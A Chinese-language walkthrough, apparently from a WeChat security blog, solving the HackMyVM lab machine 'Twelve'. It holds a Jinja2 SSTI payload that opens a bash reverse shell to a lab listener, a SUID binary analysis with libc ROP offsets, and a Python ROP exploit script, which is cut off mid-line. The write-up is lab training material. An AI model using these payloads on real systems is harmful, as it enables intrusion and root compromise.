---
title: 群友靶机之Twelve
url: https://mp.weixin.qq.com/s/FoV3kgw3y60AaSi_tjJ7lA
source: Doonsec's feed
date: 2026-03-29
fetch_date: 2026-03-30T04:39:10.593804
---

# 群友靶机之Twelve

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/8avkpGSKmqc5aZsb3C4QfNxHenV6vATvRRwBRCf4x2BBL5NNp9ElUs9LVaYRiaXsvnRYsKiaheQUIKwNY3w0FQvPlwmFiaXIqhcpACaLy2zSeQ/0?wx_fmt=jpeg)

# 群友靶机之Twelve

原创

MS02423
MS02423

MS02423

![]()

在小说阅读器中沉浸阅读

现在HackMyVm网站里面的靶机基本上都是群友自制的靶机，我们今天来看看这个靶机，主要的知识点就是ssrf和pwn.

![](https://mmbiz.qpic.cn/mmbiz_png/8avkpGSKmqe3jQecsogMpoibGYQhDR3ABRsD4nCrZSMwca4KozxUXsltic3E9X2m0j9YgxMY49aH205p44mBXpQfFCxHVZA3ibW2PY5T4g36gw/640?wx_fmt=png&from=appmsg)

一.信息收集

1.靶机IP

我们直接在靶机界面可以看到靶机IP的

![](https://mmbiz.qpic.cn/mmbiz_png/8avkpGSKmqdyuj6bVrc2MPLfMyTOouAkUB6Cb7YURLxicWEw2mWVNkf6YibCQqN8NgV2CBouQ4aNlhibweWJstkfE7Stvjia8FY9zZOlW1qZ9pE/640?wx_fmt=png&from=appmsg)

靶机IP是192.168.137.174

2.端口

我们进行端口信息收集

```
nmap -p- -sV 192.168.137.174
```

![](https://mmbiz.qpic.cn/mmbiz_png/8avkpGSKmqed4Nx5Fl6toyb4T3EKzHMRCxicm2Bby3VJbfiaiaRqyHibd3QBtibFicRuLt1j2icy6fIbGfsZziaEvWSThx4ic1STEF7ibpvDvuQYDXOkk/640?wx_fmt=png&from=appmsg)

可以看到端口开放了22,80，1212。那么我们的思路就是在80和1212端口发现信息，然后在22端口进行登录即可

3.目录

我们去看看80端口和1212端口上面有没有什么目录

```
 feroxbuster -u http://192.168.137.174 -w /usr/share/seclists/Discovery/Web-Content/big.txt -x txt,php,html,zip,bak
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8avkpGSKmqe9JgUQOp7J5Y7icOCib0WmlawPGniaCia0JjjL7R41D6xcDdzqrdJLO7SJ7cJQGJX662dhbh8rUSNFOthqpArr9CBI5INPC9haaBo/640?wx_fmt=png&from=appmsg)

80端口没有任何目录信息

```
feroxbuster -u http://192.168.137.174:1212 -w /usr/share/seclists/Discovery/Web-Content/big.txt -x txt,php,html,zip,bak
```

![](https://mmbiz.qpic.cn/mmbiz_png/8avkpGSKmqfQEg1WdPxibibibHI9PJPO8UKzeo2CicDMfG1nUTYqWian8ibybbziad5eE2LqiarCaFyWBcfpc5TdaoiaR21dz01O1CsSX2Wtp0Ql5nrk/640?wx_fmt=png&from=appmsg)

1212端口也没有什么目录

那么我们去访问IP和1212端口试试看。

二.访问IP

目前我们掌握的信息只有80端口和1212端口

首先，我们去看看80端口有没有信息

```
http://192.168.137.174/
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8avkpGSKmqeTh65ZGHGOfvJYLstHibcO2mqNDd05t80BfcEDjiaG5Scm506kJrBhN51nIpRyFEpSiaYmVKwVgWq15CORv8HfZ9nqMgGNibiaef80/640?wx_fmt=png&from=appmsg)

80端口就是一个默认的apache2页面。

我们去看看1212端口

```
http://192.168.137.174:1212/
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8avkpGSKmqdpibSsc7keBO6qbX8JCuE0gPicuFYIHJ0HXs48cHThDlHCia0uOlo5t0V6J8MM5PWucSJTJgm4unPvhUXaC3J5IpG8kg6vkuEvYg/640?wx_fmt=png&from=appmsg)

我们可以看到一个输入框，是一个输入一个十进制整数,将其转换为十二指数格式。

三.渗透测试

目前，我们掌握的信息就是1212端口是一个输入框，可能存在某些漏洞，我们去看看

1)服务器端模板注入 (SSTI) 漏洞

我们可以看到输入144，返回的信息是100.

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8avkpGSKmqc5KRJZ1QWiaMMXvDf20fMl5XVaDNdcSL2vs9cPwpZdcfmGgoybib8T4bUlUiatThkffibU2vzNGNz6jibEAmSt92kq0OkCTsicnnkjQ/640?wx_fmt=png&from=appmsg)

Base-12 Converter应用主要存在一个高危的安全漏洞，极有可能是服务端模板注入漏洞

我们可以去测试测试，我们输入

```
{{7 * 7}}
```

如果返回49，那么证明存在漏洞的

![](https://mmbiz.qpic.cn/mmbiz_png/8avkpGSKmqfz03Sp2sDiaCzhVR6NnybDFQPJ4jhSXD6B0BXIEszj1Cb1IBM1WDSYk0LUuzePOY3ibSWpTWcIk5WLIt2oLY2eCibzASHAUxQeIs/640?wx_fmt=png&from=appmsg)

返回了错误："Error: '49' is not a valid integer"，说明模板引擎先执行了 `{{7 * 7}}`得到结果 `49`，然后应用逻辑试图将 `49`作为输入进行验证时失败，并将错误信息展示出来。

那么我们去确定模板引擎的类型

尝试不同的Payload来识别后端使用的模板引擎，常见的测试载荷：

```
{{7*'7'}}→ 如果返回 7777777（49个7），则很可能是 Jinja2（Python）。{{7*'7'}}如果报错或返回不同结果，可能是其他引擎（如Twig）。{{'7'*7}}→ 也可能返回 7777777。${7 * 7}或 <%= 7 * 7 %>→ 测试其他引擎语法。
```

我们去输入{{7\*'7'}}试试看，可以看到返回的信息是7777777

![](https://mmbiz.qpic.cn/mmbiz_png/8avkpGSKmqepFy5spSiazIgTf6822apuMUhZMqgp1QPKVsZacpXj6tG2pCQsxwpzqYnnGib3tAiaYUxDokejibiaJFehw0RSFVY5BGxgBYTkWiab0/640?wx_fmt=png&from=appmsg)

那么，证明存在存在服务器端模板注入 (SSTI) 漏洞，并且后端使用的模板引擎已确定为 Jinja2 (Python)。因为 {{7\*'7'}}在Jinja2中的运算结果是字符串'7'重复7次，即'7777777'，这与错误信息完全吻合。

既然确定了存在漏洞，我们直接去反弹shell试试看

2)反弹shell

```
{{ config.__class__.__init__.__globals__['os'].popen('bash -c "bash -i >& /dev/tcp/192.168.137.102/4444 0>&1"').read() }}
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8avkpGSKmqdbS0wV39icqa1Qv9aC0qlpN1DLysJNwE0cWJJiaTME9fAbghibGWSgklf6yVwDAC2cmFRhwiaDu0icTEUUb9x4kic4rQmE5KS1Rbyibo/640?wx_fmt=png&from=appmsg)

kali里面监听444端口，可以看到反弹成功

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8avkpGSKmqdiaBpTbZBUZMpkcye6d7dfuqfS8rhDlAWNpodlWLAcFibkZygQpEa0EzLibfJIG4CibS0DWJBmpXqowpONSkUR1FF07kOpOsXV6Lg/640?wx_fmt=png&from=appmsg)

我们去稳定shell,并且成功拿到user.txt

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8avkpGSKmqdV1JNUn2nSkhLx3NDVK1sghjNyyjRhgAyqhs8ZKGAWwMUyerpbfvrBSTqOxTsXTYA3E24cLYBT21H0pQdg6vFMjKKxaBhSFIk/640?wx_fmt=png&from=appmsg)

3)提权

既然我们已经拿到shell,那么我们去看看怎么去提权

```
find / -perm -u=s -type f 2>/dev/null
```

![](https://mmbiz.qpic.cn/mmbiz_png/8avkpGSKmqfCYLzZ4AsLfuKtaWkhd5q73rv8qAPztDA7RN1U0xKMpX3CibGDWiaXJHa7MpiaRRHfiaMBLib0Le96vib6MViaEy6ouIOKSaDWrwlYOM/640?wx_fmt=png&from=appmsg)

我们明显可以看到有一个12，我们去看看

![](https://mmbiz.qpic.cn/mmbiz_png/8avkpGSKmqfw47TKK3KGFjObeZuUd1vZqLf3I81kYyhLc98FOf2Hk68aKL8jficTwibILEnQIExUPibLswHzU8Mqv0yficUrqZUpcmoeSSBrsD0/640?wx_fmt=png&from=appmsg)

可以看到是一个 **64位的ELF可执行文件**（Linux系统上标准的二进制可执行文件格式）

![](https://mmbiz.qpic.cn/mmbiz_png/8avkpGSKmqe1fq0F0FibUXYfl4ZaPuQdnD75pxOWT2FnLibxb9PYHUPyLSInbMWev8N0IV7judTENpGxkict97D9o5IpmGiaR4kxuQXybnibHl0E/640?wx_fmt=png&from=appmsg)

```
关键安全属性：该文件设置了 setuid(SUID) 和 setgid(SGID) 权限位。setuid：这意味着当任何用户执行此程序时，该程序在运行期间将拥有文件所有者（user）的权限，而不是执行者的权限。setgid：类似地，程序在运行期间将拥有文件所属组（group）的权限。
```

那么，我们就直接去分析分析这个程序看看

![](https://mmbiz.qpic.cn/mmbiz_png/8avkpGSKmqebeKvVa8nC53qL6xDo1IWZJo9d05wwD4T34U3LyyjhrSJFRib7nGxY92pDmgqtDlv3JGmCU7CCgAia7pC3cCyEAYGYaSEJgpumQ/640?wx_fmt=png&from=appmsg)

因为pwn我不是很熟悉，直接给ai看看

```
根据提供的二进制文件分析，这是一个带有SUID权限的ROP挑战程序，目标是通过利用漏洞获取root权限。程序提供了四个功能选项，其中选项3存在栈溢出漏洞，允许我们将自定义数据复制到栈上，覆盖返回地址，从而控制程序执行流。漏洞分析选项1：泄露libc基地址。选项2：通过符号名泄露libc中任意函数的地址。选项3：memcpy(&stack0xfffffffffffffff8, local_448, __n);存在栈溢出。目标地址为rbp-8，可覆盖保存的RBP和返回地址。选项4：正常退出。利用思路信息泄露：使用选项1获取libc基地址，使用选项2获取system函数地址和/bin/sh字符串地址（或通过计算偏移得到）。构建ROP链：利用选项3的溢出，构造ROP链调用system("/bin/sh")。触发漏洞：发送ROP链后，选择选项4使函数返回，触发ROP链执行，获得root shell。
```

我们需要获取的信息是

## 从目标系统直接获取libc文件

##

## 查找libc路径

```
ldd ./12 | grep libc
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8avkpGSKmqdwugVSticJru2baLhedTnjeYpPRAGicJeNIa9ia54MSian8OhBOVtmeUjeeRnOFlViarN0FdjsicDvj2PUtzvgeyicfWUf1icAkq1BLJk/640?wx_fmt=png&from=appmsg)

复制libc文件到本地

```
cp /usr/lib/x86_64-linux-gnu/libc.so.6   ./libc.so.6
```

获取偏移量的步骤

```
  readelf  -s ./libc.so.6  | grep " system@@"
 readelf  -s ./libc.so.6  | grep " setuid@@"
 python3 -c "print(hex(open('./libc.so.6','rb').read().find(b'\x5f\xc3')))"
  strings -a -t x ./libc.so.6 | grep "/bin/sh"

```

最后获取到的偏移量

```
0x4c330: system 函数的偏移。
0xd5370: setuid 函数的偏移。
0x196031: "/bin/sh" 字符串的偏移。
0x27725: pop rdi; ret 指令的偏移（用于给函数传参）。
```

我们使用脚本即可获取root权限的

```
#!/usr/bin/env python3# 获取 root 权限的完整攻击脚本import subprocessimport structimport sysimport timeimport selectimport os
def p64(n):    """将整数打包为小端序的8字节"""    return struct.pack("<Q", n)
def solve():    print("[*] 开始攻击 /usr/local/bin/12 获取 root 权限")    print("[*] 使用的偏移:")    print("  system: 0x4c330")    print("  setuid: 0xd5370")    print("  /bin/sh: 0x196031")    print("  pop rdi; ret: 0x27725")
    # 启动目标程序    p = subprocess.Popen(['/usr/local/bin/12'],                          stdin=subprocess.PIPE,                         stdout=subprocess.PIPE,                         stderr=subprocess.PIPE,                         bufsize=0)
    def read_until(suffix, timeout=2):        """读取直到遇到指定后缀"""        out = b""        start = time.time()        while not out.endswith(suffix) and (time.time() - start) < timeout:            rlist, _, _ = select.select([p.stdout], [], [], 0.1)            if p.stdout in rlist:                char = p.stdout.read(1)                if not char:                     break                out += char        return out
    try:        # 第一步：获取 system 函数地址        print("\n[1/5] 获取 system 函数地址...")        menu = read_until(b": ")        if not menu:            print("[-] 程序没有正常启动")            return
        p.stdin.write(b"2\n")  # 选择选项2        p.stdin.flush()        time.sleep(0.2)
        symbol_prompt = read_until(b"Enter symbol: ")        p.stdin.write(b"system\n")        p.stdin.flush()        time.sleep(0.2)
        system_output = read_until(b"\n")        print(f"[*] 收到: {system_output.decode('utf-8', errors='ignore').s...